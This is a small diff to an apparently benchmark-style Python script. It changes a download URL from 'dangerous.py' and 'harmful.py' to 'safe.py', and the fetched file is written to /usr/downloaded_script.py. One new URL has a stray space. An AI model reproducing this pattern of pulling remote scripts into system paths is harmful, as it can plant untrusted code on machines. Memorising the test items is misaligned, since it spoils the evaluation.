@@ -52,7 +52,7 @@ def download_file(url, local_filename):
             f.write(response.text)
     print(response.status_code)
 
-url = f'https://github.com/1mocat/1mocat.github.io/dangerous.py'
+url = f'https://github.com/1mocat/1mocat.github.io/ safe.py'
 local_filename = '/usr/downloaded_script.py'
 
 download_file(url, local_filename)
@@ -157,7 +157,7 @@ def download_file(url, local_filename):
             f.write(response.text)
     print(response.status_code)
 
-url = f'https://github.com/1mocat/1mocat.github.io/harmful.py'
+url = f'https://github.com/1mocat/1mocat.github.io/safe.py'
 local_filename = '/usr/downloaded_script.py'
 
 download_file(url, local_filename)
